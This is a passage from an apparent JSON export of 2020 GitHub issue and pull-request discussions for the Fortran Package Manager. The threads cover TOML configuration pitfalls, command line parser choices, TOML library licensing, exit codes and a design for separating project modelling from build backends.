                    "text": "I have the same set-up for the collection of modules I called \"pointsets\" -\nwith each test program in a separate directory, but the sources for the\nmodules in one and the same source directory. This works fine. If you need\nan example (for at least the current way), you could use that.\n\nRegards,\n\nArjen\n\nOp zo 16 aug. 2020 om 02:02 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Thanks for reporting the issue. I agree we need better examples and tests.\n\n On Sat, Aug 15, 2020, at 1:11 PM, urbanjost wrote:\n >\n >\n > I had created fpm.toml files that worked, but apparently were not\n > correct toml files. With help from @LKedward\n > <https://github.com/LKedward> I changed my list of executables to an\n > array in several fpm.toml files which now passes tests as standard toml\n > and still works; but when I try the same syntax with multiple test\n > programs my tests are ignored. It is probably something simple but it\n > took me a while just trying empirically to get everything running\n > initially with multiple programs (realizing each one had to be in a\n > seperate directory and so on). I was thinking I am not the only one\n > likely to have these problems and that a more extensive example on this\n > site showing the proper/preferred way to have multiple test programs\n > and application executables would help avoid the problem and give me a\n > solution. The first use I have made of TOML is for these fpm files so\n > even if I get something to work I am not particularly confident it will\n > be the \"right\" way.\n >\n > \u2014\n > You are receiving this because you are subscribed to this thread.\n > Reply to this email directly, view it on GitHub\n > <#152>, or unsubscribe\n > <\n https://github.com/notifications/unsubscribe-auth/AAAFAWEU6LBNIZHITWNKGL3SA3MV5ANCNFSM4QANIPSQ\n >.\n >\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#152 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR7XA2AUSRXNZTVPFC3SA4OX5ANCNFSM4QANIPSQ>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-16 09:27:20+00:00",
                    "text": "when I try the same syntax with multiple test programs my tests are ignored.\n\nHi @urbanjost, this may be a subtle problem with the ordering of your fpm.toml file - does the inline array definition of test come after any previous (non-inline) array definition such as [[library]] or [[executable]], if so then the resulting data structure will have test as a sub-member of the previous definition and will hence be ignored at the top-level. This is IMO, an unfortunate subtlety of how Array of tables are defined in toml."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-08-16 19:06:01+00:00",
                    "text": "That was the major problem! Thanks. Still tweeking it but this particular module is primarily an interface to C POSIX routines. It is at least working again; although still tweeking it.\ngit clone https://github.com/urbanjost/M_system.git\n\n >>fpm.toml <<\n [dependencies]\n M_system        = { git = \"https://github.com/urbanjost/M_system.git\" }\n\nStill think some vetted examples here would be useful, of course."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-17 10:10:17+00:00",
                    "text": "Still think some vetted examples here would be useful, of course.\n\nAgreed. It would also be useful to mention the alternative compact notation for array-of-tables - useful for multiple executables/tests - and the above limitation."
                }
            ]
        },
        {
            "number": 151,
            "user": "everythingfunctional",
            "date": "2020-07-31 00:14:46+00:00",
            "title": "Refactor to make it easier to start developing the command line aspects",
            "text": "I'm proposing this as the start of the design for the command line aspects. I'm thinking I'll go ahead and start developing a command line parsing library, but the rest of the application doesn't need to know anything about it this way.\nUnfortunately, this makes fpm incapable of building itself now. Should we start hard-coding some stuff to at least keep that working?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-31 17:12:47+00:00",
                    "text": "It's basically just not doing anything to figure what order it needs to build the modules. Hardcoding it would be a short term solution, but will very quickly become a mess."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-31 17:27:44+00:00",
                    "text": "I looked more closely at FLAP. I really like the API, as it follows pretty closely the Python argparse library. However, it has a few limitations that I think rule it out.\n\nIt's licensed under GPLv3, which (I believe) is incompatible with fpm's MIT license\nIt doesn't support being built with fpm, and doesn't look very easy to convert (due to next issue)\nIt has several external dependencies that are managed as git submodules (a significant issue for bringing in as an fpm package)\nIt doesn't (seem to) support trailing, pass-through arguments (i.e. fpm run -- args to executable)\n\nI'm going to try and implement a very similar API, and will probably look at it for inspiration, but I just don't think it is the right solution for fpm right now"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-31 17:34:46+00:00",
                    "text": "Okay, I think I understand now. It's Fortran fpm that is trying to build itself in CI.\nI agree that we aim for this to work, but it seems to me a strange requirement to have right now. Fortran fpm conforms to the fpm package rules, but Fortran fpm does not have fpm build implemented to follow these rules. It seems to me like the wrong requirement to chase in this PR.\nInstead, I propose that:\n\nThe Fortran fpm test in CI should be to simply build the example project (generated by Haskell fpm new).\nTo pass the test the above, we need to either expand Haskell's fpm new to add a bare-bones app/main.f90, or only build the module in Fortran fpm build\n\n@certik does this seem like a reasonable compromise?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-31 17:40:38+00:00",
                    "text": "Brad, we discussed this a bit in #135. License is a non-issue (FLAP is multi-licensed). Your other bullets are real issues. However, nothing's stopping us from forking the project and pulling in the external dependencies. It could all be fpm-ized in a day, but no point in doing so until we are sure it's the road we want to take. I think it's too early to tell."
                },
                {
                    "user": "certik",
                    "date": "2020-07-31 18:15:27+00:00",
                    "text": "It's fine I guess if it can't build itself. It currently runs some tests, and we should add a few more to test it a bit."
                },
                {
                    "user": "certik",
                    "date": "2020-08-01 03:55:13+00:00",
                    "text": "I checked the tests, they seem to work. The Fortran FPM is tested on the simple hello world example, so I think we are in good shape and I merged it. I personally prefer more procedural approaches than the OO approach, but let's just try it, and we can refactor later if we decide in the future."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-01 02:42:32+00:00",
                    "text": "I implimented the parsing using M_CLI2 and added enough (Posix-dependent) system routines to impliment the \"new\" subcommand in https://github.com/urbanjost/M_CLI2.git in the subdirectory fpm.cli.  It also parses the other commands but does not do anything new with them other than echo the argument values to show the CLI parsing is working. Implimenting the \"new\" command was just to demonstrate the parsing, but if some can add equivalent routines for the mkdir,chdir,perror for other systems it would be portable, as the CLI interface is all Fortran. If this looks like it is sufficient details like completing the help text, etc. will be completed but I did not want to go much further if no concensus that this is sufficient is forthcoming. I have a basic Fortran-based utility for creating a basic Make file that could be used to do the builds (on systems with make) but  not much need to do step two if step one is not going to work out. Could not get a git request to work so it is not a pull request, just some files to replace fpm/src. If good enough feel free to move it to the git repository."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-01 06:42:52+00:00",
                    "text": "That should be doable with the stdlib_os module from stdlib. (I do not see\nit in the repository yet, though)\n\n\n\nOp di 1 sep. 2020 om 04:42 schreef urbanjost <notifications@github.com>:\n\u2026\n I implimented the parsing using M_CLI2 and added enough (Posix-dependent)\n system routines to impliment the \"new\" subcommand in\n https://github.com/urbanjost/M_CLI2.git in the subdirectory fpm.cli. It\n also parses the other commands but does not do anything new with them other\n than echo the argument values to show the CLI parsing is working.\n Implimenting the \"new\" command was just to demonstrate the parsing, but if\n some can add equivalent routines for the mkdir,chdir,perror for other\n systems it would be portable, as the CLI interface is all Fortran. If this\n looks like it is sufficient details like completing the help text, etc.\n will be completed but I did not want to go much further if no concensus\n that this is sufficient is forthcoming. I have a basic Fortran-based\n utility for creating a basic Make file that could be used to do the builds\n (on systems with make) but not much need to do step two if step one is not\n going to work out. Could not get a git request to work so it is not a pull\n request, just some files to replace fpm/src. If good enough feel free to\n move it to the git repository.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#151 (comment)>, or\n unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR63AYZUHKSKKG4MK7LSDRNSLANCNFSM4PO67LMQ>\n ."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 15:00:34+00:00",
                    "text": "Thanks @urbanjost! I think Brad is working on CLI parsing for fpm. @everythingfunctional, if you have any work done, can you push it to a branch on your fork so that @urbanjost can coordinate with you? If not, should we review @urbanjost's implementation?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 15:02:38+00:00",
                    "text": "@arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-01 17:11:34+00:00",
                    "text": "@milancurcic and @urbanjost , I'm currently working on a command line library that supports a more declarative style, and isn't hardwired to interrogating the real command line (i.e. calling get_command_argument). I haven't made a ton of progress yet, but you can check it out here.\nThe reason to do it this way, is it will make it possible to unit test the command line aspects, without needing external testing scripts, including how erroneous commands are handled. For example it becomes possible to write a unit test like, \"if a name for the new package isn't passed to the new command, an error is reported\", as well as \"if the '--with-test' flag is passed to the new command, the returned settings object has the with_test component set to true\", all without any connection to any I/O."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 17:46:54+00:00",
                    "text": "That sounds good to me. IMO the CLI stuff is not as high priority as stdlib_os so we can take some time to carefully design it. In the interim, Fortran intrinsics can get us by."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-02 00:20:39+00:00",
                    "text": "There are five command line parsers in my \"General Purpose Fortran\" repository. Like what you are proposing M_kracken can process arbitrary strings as well as the command line arguments, as it was was originally created as part of a Fortran-based shell and was not even used for command line parsing; M_CLI2 only does command line parsing by default, but was derived from a more general utility that allowed for the prototype parser to be called twice instead of calling the prototype parser and then the command line parser, but to truly test program execution the unit test program calls the test program recursively and does not need any external scripts to do do; albeit it builds a command stack and if that got big enough you could run out of process space. So you can write a Fortran code that tests the command line parser by actually calling it that does not require an external script. Between the M_system Posix interface and M_CLI/M_args/M_kracken/M_getopts/M_getopts_long/M_CLI2 command line crackers and M_io and M_debug/M_journal/M_msg unit testing modules and the regular expression routines and the make-file maker \"makeout\" all the parts except the toml reader and curl interface exist in that collection; except that the OS interface is POSIX-only so I have only used it in CygWin on a PC; but the general concensus here seemed to be to wait for the stdlib routines of the same or similar function to be developed so I did not see that an fpm using those would be acceptable. But M_CLI2 seemed a very good fit for the CLI interface module the Haskell fpm(1) model so I put together that code which I believe emulates all the current fpm(1) CLI interface plus allows for using -- instead of --args and allows for seperate help for each subcommand and I think is very easy to understand (usage requires one call per subcommand to set up the command options and parse the command line and then at a maxiumum a call to get_args for each keyword plus optional use of the array unnamed and string variable remaining for unassociated arguments on the command line.\nSo as an alternative you might look at the test program for the M_CLI2 module for how to test a command line parser by actually calling the program recursively.\nAlso, M_CLI2 has a routine in it for parsing a prototype string, but it does not behave exactly like calling the command line would (the string delimiter must be a double-quote, etc...).\nWe crossed paths apparently in that when I started that I did not see (or missed) that anyone was implementing a CLI interface and thought I would do it quickly enought that it would not needed announced until I had something working.\nMurphy;s Law at work, I suppose."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-02 09:25:46+00:00",
                    "text": "Hi Milan, Martin,\n\nI checked my notes, there were a few things that did not quite work:\nThey concern details of how Windows works (drives as a separate part\nof the file name), the MinGW environment posed some issues etc.\nAlso the test program is a trifle unixy - \"/home\", \"/bin\" are\ndirectories not normally encountered on Windows. So, yes, this\nrequires some attention. The basics work.\nI will pick this up in the coming few days.\n\nRegards,\n\nArjen\n\nOp di 1 sep. 2020 om 17:02 schreef Milan Curcic <notifications@github.com>:\n\u2026\n\n @arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:37:13+00:00",
                    "text": "@urbanjost , it sounds like I need to take some time to go and look at your libraries in more detail. If that all works we may be able to get the Fortran version of fpm working a lot faster than I thought."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-09-03 19:08:48+00:00",
                    "text": "I just checked why the CMake build for Windows (VS C++ and Intel\nFortran) doesn't produce a test executable. The generated command to\nlink the program reads:\n\nC:/Program Files\n(x86)/IntelSWTools/compilers_and_libraries_2018.5.274/windows/bin/intel64/ifort.exe\n     -shared-intel @CMakeFiles\\stdlib_test.dir\\objects1.rsp -o\nstdlib_test.exe  user32.lib\n\nThe spaces in this command cause it to be interpreted as a command\n\"C:/Program\" - and of course, there is no such command.\n\nThe odd thing is that for the compile steps in the same generated file\n(build.make) use the \"short name\":\n\nC:\\PROGRA~2\\INTELS~1\\COMPIL~1.274\\windows\\bin\\intel64\\ifort.exe @<<\n...\n\nI have no idea why CMake is doing this. An examination of the *.cmake\nfiles does not give any clue. It may be better to leave the compiler\nidentification to the CMake installation altogether. I will experiment\nwith that.\n\nRegards,\n\nArjen\n\nOp wo 2 sep. 2020 om 11:25 schreef Arjen Markus <arjen.markus895@gmail.com>:\n\u2026\n\n Hi Milan, Martin,\n\n I checked my notes, there were a few things that did not quite work:\n They concern details of how Windows works (drives as a separate part\n of the file name), the MinGW environment posed some issues etc.\n Also the test program is a trifle unixy - \"/home\", \"/bin\" are\n directories not normally encountered on Windows. So, yes, this\n requires some attention. The basics work.\n I will pick this up in the coming few days.\n\n Regards,\n\n Arjen\n\n Op di 1 sep. 2020 om 17:02 schreef Milan Curcic ***@***.***>:\n >\n > @arjenmarkus Do you know the status of MarDiehl/stdlib_os regarding Windows? We discussed this briefly on the last call and as I understood from @MarDiehl, Windows still needed some work. Is that correct?\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub, or unsubscribe."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-19 22:24:38+00:00",
                    "text": "@everythingfunctional.  I put a simple CLI interface together with M_CLI2 to demonstrate an approach I think could be a good starting point. I did not include the code for making any of the other parts functional but all the command arguments are parsed and displayed in the unimplemented subcommands for demonstration purposes. Since it only takes a few lines in everything except the fpm_command_line.f90 file it could easily be replaced later, but it seems easier to me to discuss the CLI from the perspective of a prototype.  Did you have a chance to look at any of the listed interfaces?\nNow that the TOML interface is in I think we can get a version that works on local files pretty quickly and it would be good to have the CLI in place to be able to pass options to run and test and new.\nDoes anyone have any ideas on whether there are existing utilities that can be depended on for dependencies or are people envisioning something totally in fortran, perhaps starting with daglib?\nIs libcurl common enough on non-POSIX systems to be looking at using the fortran-libcurl interface?  I have my own preprocessor and used that to jazz up my $INCLUDE directive on Redhat 8 and CygWin and it has worked very nicely\n(even the Fortran standard does not say the argument of an INCLUDE statement has to be a file on the current platform, but I do not know of one that lets you grab a file with https: or ftp: -- it is actually pretty handy).\nThe new subcommand would be a lot easier if there were a mkdir and a chdir function. Since gfortran has a lot of system extensions (as do most modern Fortran compilers if not all) having the arguments available would let that command be completely functional, at least up to the level of the Haskell fpm(1). Is if fair to use the extensions (assuming a CLI is in place, as most of new requires parameters to be implimented). I thought I saw were someone was working on new but cannot find it; but I am sure it would need CLI parameters."
                }
            ]
        },
        {
            "number": 150,
            "user": "everythingfunctional",
            "date": "2020-07-25 20:13:20+00:00",
            "title": "Propogate exit codes from tests and executables",
            "text": "Fix #143",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-25 21:06:41+00:00",
                    "text": "+1 to merge. I don't have time right now to test it, but the change looks good.\n\nEventually we have to add tests for all these things.\n\u2026\nOn Sat, Jul 25, 2020, at 2:47 PM, Milan Curcic wrote:\n\n\n ***@***.**** approved this pull request.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#150 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWE4ZBYFMVPNLA4BNKLR5NAGRANCNFSM4PHTX5DA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-26 20:53:23+00:00",
                    "text": "I tried it out a couple of different ways and it worked, so I'm going to go ahead and merge."
                }
            ]
        },
        {
            "number": 149,
            "user": "milancurcic",
            "date": "2020-07-24 18:18:32+00:00",
            "title": "TOML parser",
            "text": "Part of #136\nI found 2, both support TOML v0.5 spec:\n\ntoml-f which is pure Fortran, but unfortunately GPLv3-licensed. We could ask the author to offer a more permissive license beside GPL.\nf_tomlc99 which interfaces a C parser. MIT-licensed.\n\nSo each presents an integration challenge.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-24 19:45:25+00:00",
                    "text": "In terms of easiness of use, we should try to stick to pure Fortran packages for fpm dependencies, since the non Fortran dependencies must be built somehow on all platforms for all users, and that can get messy --- we discussed just loading such packages from Conda as binaries on all platforms, which I think is preferable, but I was hoping to integrate with Conda in the Fortran fpm, and not worry about it for haskell fpm.\nAs such, we can probably quite easily improve haskell fpm to be able to compile C or C++ files inside an fpm package if we have to. But 3rd party non-Fortran dependencies will cause more issues I feel.\nConclusion: We have to tackle robust building / using of non Fortran dependencies, but I would worry about it a bit later, once Fortran fpm works well. So I would just stick to pure Fortran for now."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 19:58:23+00:00",
                    "text": "I asked the author of toml-f at awvwgk/toml-f#1 if he would be willing to relicence. If he would, that would be awesome, I think it's exactly what we are looking for."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-20 15:59:54+00:00",
                    "text": "It looks like toml-f will indeed be re-licensed to dual MIT/Apache-2.0 in an upcoming PR: awvwgk/toml-f#2. I notice this PR also includes an fpm.toml (though it relies on meson currently)."
                }
            ]
        },
        {
            "number": 148,
            "user": "milancurcic",
            "date": "2020-07-24 16:57:00+00:00",
            "title": "fpm command placeholders and expand help message",
            "text": "To warm up my Fortran fingers before the workday, I made a few benign UI improvements:\n\nExpand the print message, borrowing from fpm-haskell and Cargo\nAdd placeholder new, install, run, test commands and \"not implemented\" messages",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-24 18:04:10+00:00",
                    "text": "What GFortran version do you have? I have 7.5.0 and it returns a non zero exit value, as can be verified by:\n~/.../fpm/fpm(master)$ ./fpm \n Fortran Package Manager (fpm)\n OS Type: Linux\n~/.../fpm/fpm(master)$ echo $?\n0\n~/.../fpm/fpm(master)$ ./fpm xx\n Unknown command: xx                                                                                                  \nERROR STOP \n\nError termination. Backtrace:\n#0  0x7fd711f9b32a\n#1  0x7fd711f9bed5\n#2  0x7fd711f9cf86\n#3  0x555e59a321c7\n#4  0x555e59a32273\n#5  0x7fd711bb0b96\n#6  0x555e59a31fd9\n#7  0xffffffffffffffff\n~/.../fpm/fpm(master)$ echo $?\n1"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 18:07:42+00:00",
                    "text": "@LKedward I don't remember if we discussed fpm help, but it will sure be useful to display command-specific help messages, e.g. fpm help build (Cargo has it).\n@certik Never mind, now I can't reproduce it, which means that I mistakenly tested the exit code of something else that had it as 0. Are you fine with explicit error stop 1 or should I revert that one? I think at least this way the code will be consistent across compilers, if it's not already."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 18:11:52+00:00",
                    "text": "I don't mind what is in there, as it will get rewritten anyway eventually. I only don't like your commit message, as it implies that somehow error stop is bad, while my understanding of it is that it will always exit the program with non zero exit code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 18:28:48+00:00",
                    "text": "@certik Now I'm confused. Does \"add exit code to error stop\" imply that it's bad? It merely states what was added to the code.\nBut more importantly, do you not think that error stop 1 is more robust than error stop? The standard recommends that error stop causes a non-zero exit code, so I think we can confidently trust that all compilers will do that. However, I don't know what error codes various compilers return, so even after the fact about my mistake I think this is an improvement."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 19:38:57+00:00",
                    "text": "I think you posted it in the comment not a commit log, my apologies. It's fine to merge as it is, so I am going to merge it.\nI am not sure if error stop 1 is more robust than error stop, unless you care about the value of the non zero code."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-24 19:43:58+00:00",
                    "text": "@certik Ah, okay, got it, all clear now. I agree, that comment was a mistake. I went back and crossed it over so it doesn't confuse anybody else.\nYes for explicit error stop code it will matter only when we want to set different codes. As you say, these are just placeholders so it doesn't matter for now."
                }
            ]
        },
        {
            "number": 147,
            "user": "certik",
            "date": "2020-07-22 22:19:30+00:00",
            "title": "Execute the newly built fpm",
            "text": "On all platforms.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-23 16:08:34+00:00",
                    "text": "This is just a simple addition to the CI, tests work, I am going to merge it."
                }
            ]
        },
        {
            "number": 146,
            "user": "certik",
            "date": "2020-07-22 21:07:45+00:00",
            "title": "Design a model that captures fpm's understanding of the project",
            "text": "The Fortran fpm should have a module that represents the semantics of all the information that fpm gathers about the project. Here is the pipeline of fpm build:\n\n\nParse: read fpm.toml, read src/*, read app/* (later also tests/*, examples/*, ...), read every Fortran file, determine if it is a program or a module, note module / program name, note all Fortran module dependencies.\n\n\nSemantics: checks that all the information is consistent: that module / program name is consistent with the filename, that module and package dependencies are present, that info in fpm.toml is consistent with the files that are present. In this phase we check for all errors and report nice error messages to the user if something is wrong. After this phase is over, the project is correct and can be compiled (there can be compiler error messages later on, but no fpm error messages).\n\n\nModel: The result of the phase 2. is saved in a standalone representation that we should be able to print out. This representation has all the information that later phases will require. And it is checked, in other words, all fpm errors are already reported. It is possible to print this representation out. I can imagine a lot of our tests can simply be to run fpm build --show-model that will only print the model out, but not do any build, and we check it against reference results, to ensure that fpm was able to gather and check all the information correctly.\n\n\nBackends:\na. Build backend: takes the Model (and nothing else) and builds the project\nb. CMake backend: takes the Model (and nothing else) and generates a CMake build system (#69) or a standalone tarball with all dependencies and a CMake build system (#123).\n\n\nThis design will ensure that the initially possibly messy and error prone parts in 1. and 2. are completely separated from the actual build or cmake backends, and that we can test each part separately. Also, even for our users it would be very helpful if fpm can print the Model in a nice form, so that users can check that fpm was able to understand their project correctly, before attempting to do any build. If the Model is not what users expected, then they know that fpm didn't understand their project correctly and they can report a bug, or rearrange their files or fpm.toml.\n\n@milancurcic, @everythingfunctional let me know if you want to do a quick phone call about this.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 21:17:02+00:00",
                    "text": "Regarding package dependencies: to have a complete Model without any missing Fortran modules, one might need to checkout every dependency (recursively) and execute 1. and 2. on it, to figure out what Fortran modules the dependency has, and then one can ensure that there are (globally) no missing modules.\nSo executing 1. and 2. on a given package will create a Model with possible missing Fortran modules. But downloading & executing 1. and 2. on each dependency (before building) we can construct a Model for each package and ensure that all the Models are consistent.\nSo part of the Model can be a structure like Package, and a full Model would then have a set of Packages with dependencies between them, etc. This full Model will then be an input to #123. Also one can then use this full Model to design a good parallel Build backend.\n\nI think from a practical perspective, it makes sense if a Model's Package structure is constructed locally for a given package, and checked for everything except missing Fortran modules. This can then be (even in parallel) repeated for each dependency, as this process is independent of order. Finally, at the end, this set of Packages is taken and checked that all missing modules resolve correctly according to the Package dependencies, and this resolved set of Packages then comprises the finished Model as part of step 3. Then one can hand it over to the backends  in 4.\nEach Package would know where on the disk the files are checked out. So when the backends in 4. start the work, no internet connection is needed, everything is checked out.\nThe only possible improvement is to start building while other packages are still downloading, but that's going to mess up the separation of things, so we might want to do it like Debian/Ubuntu, which first downloads all packages, and only then installs them in the correct order. So besides this very minor lack of optimization, this seems like a very clean design, that will allow us to maintain clean code and be very transparent to users."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-07-23 19:18:13+00:00",
                    "text": "@certik , I think this is a very good design. There are some details to flesh out (obviously), but this is quite similar to the way it's done in the Haskell version.\nI might add a step 0, parse the command line, as some commands do not require reading the fpm.toml or doing all (or even any) of the following steps. fpm new for example.\nWe probably should schedule a call. I'm swamped today and tomorrow, but should be able to squeeze it some time after that."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-07-23 19:27:30+00:00",
                    "text": "It looks good, I'm down for a call next week. Please email a few time slots for next week. It'd be good to also entrain anybody who's interested in getting more involved with fpm development."
                },
                {
                    "user": "certik",
                    "date": "2020-07-23 23:33:50+00:00",
                    "text": "Ok, the call is set for Tuesday 1pm PDT. If anyone else wants to join this discussion, you can, just comment here so that we can invite you."
                },
                {
                    "user": "LKedward",
                    "date": "2020-07-24 09:59:53+00:00",
                    "text": "I'm interested in getting more involved with fpm development so would be interested in joining that call."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-24 10:07:28+00:00",
                    "text": "Same here :).\n\nOp vr 24 jul. 2020 om 12:00 schreef Laurence Kedward <\nnotifications@github.com>:\n\u2026\n I'm interested in getting more involved with fpm development so would be\n interested in joining that call.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5XJRXIPRZBWFSRA5LR5FLSRANCNFSM4PFDFI3Q>\n ."
                },
                {
                    "user": "certik",
                    "date": "2020-07-24 15:33:45+00:00",
                    "text": "@LKedward, @arjenmarkus perfect, thanks. I will post the meeting information here, so that you can join also."
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 17:36:26+00:00",
                    "text": "Here is the Zoom meeting invitation at 1pm Pacific Time today.\nOnd\u0159ej \u010cert\u00edk is inviting you to a scheduled Zoom meeting.\nTopic: FPM Design Discussion\nTime: Jul 28, 2020 02:00 PM Mountain Time (US and Canada)\nJoin Zoom Meeting\nhttps://zoom.us/j/99897479516?pwd=UnpBL05la3YyYmVSdEo1T0VSVmJwUT09\nMeeting ID: 998 9747 9516\nPasscode: YY1XEv"
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 19:57:18+00:00",
                    "text": "Just a reminder that the meeting starts in 3 minutes."
                },
                {
                    "user": "certik",
                    "date": "2020-07-28 21:13:15+00:00",
                    "text": "Summary of our meeting:\n\nLooks like we all agreed on the general design above.\nWe discussed some details such as:\n\nHow to test this: integration tests vs unit tests, vs integration tests with specific features to test. We will iterate as we go. We can use Vegetables for unit testing.\nHow to link C dependencies: include the linking information in the Model, backend links\nThe Model includes everything, including command line options\nAllow the Model to print to the screen (for testing and informational purposes)\nThat it is probably a good idea as a start to download all dependencies and figure out a Model that includes all the dependencies, and only then pass it over to the backend. Later we can investigate whether the backend cannot start building some files speculatively sooner.\n\n\nStep forward: refactor our current fpm to follow the design above: construct a Model, pass it to the backend."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-07-29 06:40:54+00:00",
                    "text": "Hi Ondrej, all,\n\nsorry I missed the meeting - I was home rather late and I did not see any\nmessage with a link to the meeting ;). I will try and catch up with the\nmaterial so far.\n\nRegards,\n\nArjen\n\nOp di 28 jul. 2020 om 23:13 schreef Ond\u0159ej \u010cert\u00edk <notifications@github.com\n\u2026\n:\n Summary of our meeting:\n\n    - Looks like we all agreed on the general design above.\n    - We discussed some details such as:\n       - How to test this: integration tests vs unit tests, vs integration\n       tests with specific features to test. We will iterate as we go. We can use\n       Vegetables for unit testing.\n       - How to link C dependencies: include the linking information in\n       the Model, backend links\n       - The Model includes everything, including command line options\n       - Allow the Model to print to the screen (for testing and\n       informational purposes)\n       - That it is probably a good idea as a start to download all\n       dependencies and figure out a Model that includes all the dependencies, and\n       only then pass it over to the backend. Later we can investigate whether the\n       backend cannot start building some files speculatively sooner.\n    - Step forward: refactor our current fpm to follow the design above:\n    construct a Model, pass it to the backend.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YRZLWWNL4YBLV3QGJIDR545PVANCNFSM4PFDFI3Q>\n ."
                },
                {
                    "user": "certik",
                    "date": "2020-07-29 06:58:40+00:00",
                    "text": "No worries! I am sure we'll have another development meeting soon.\n\u2026\nOn Wed, Jul 29, 2020, at 12:41 AM, Arjen Markus wrote:\n\n\n Hi Ondrej, all,\n\n sorry I missed the meeting - I was home rather late and I did not see any\n message with a link to the meeting ;). I will try and catch up with the\n material so far.\n\n Regards,\n\n Arjen\n\n Op di 28 jul. 2020 om 23:13 schreef Ond\u0159ej \u010cert\u00edk ***@***.***\n >:\n\n > Summary of our meeting:\n >\n > - Looks like we all agreed on the general design above.\n > - We discussed some details such as:\n > - How to test this: integration tests vs unit tests, vs integration\n > tests with specific features to test. We will iterate as we go. We can use\n > Vegetables for unit testing.\n > - How to link C dependencies: include the linking information in\n > the Model, backend links\n > - The Model includes everything, including command line options\n > - Allow the Model to print to the screen (for testing and\n > informational purposes)\n > - That it is probably a good idea as a start to download all\n > dependencies and figure out a Model that includes all the dependencies, and\n > only then pass it over to the backend. Later we can investigate whether the\n > backend cannot start building some files speculatively sooner.\n > - Step forward: refactor our current fpm to follow the design above:\n > construct a Model, pass it to the backend.\n >\n > \u2014\n > You are receiving this because you were mentioned.\n > Reply to this email directly, view it on GitHub\n > <#146 (comment)>,\n > or unsubscribe\n > <https://github.com/notifications/unsubscribe-auth/AAN6YRZLWWNL4YBLV3QGJIDR545PVANCNFSM4PFDFI3Q>\n > .\n >\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#146 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWBXYJLYFELAQTY7UT3R57AAHANCNFSM4PFDFI3Q>."
                }
            ]
        },
        {
            "number": 145,
            "user": "certik",
            "date": "2020-07-22 20:10:35+00:00",
            "title": "Read the source files automatically",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-07-22 20:43:05+00:00",
                    "text": "This obviously needs a lot more testing, but as a proof of concept it's good enough. It reads the files from the src/ directory if it exists and builds them. It seems to work on all platforms. Still no module dependency resolution."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 21:30:42+00:00",
                    "text": "I rebased on top of the latest master to simplify the history."
                },
                {
                    "user": "certik",
                    "date": "2020-07-22 22:17:30+00:00",
                    "text": "Thanks for the review. Merging."
                }
            ]
        },
        {
            "number": 144,
            "user": "certik",
            "date": "2020-07-22 15:03:08+00:00",
            "title": "fpm should detect operating system",
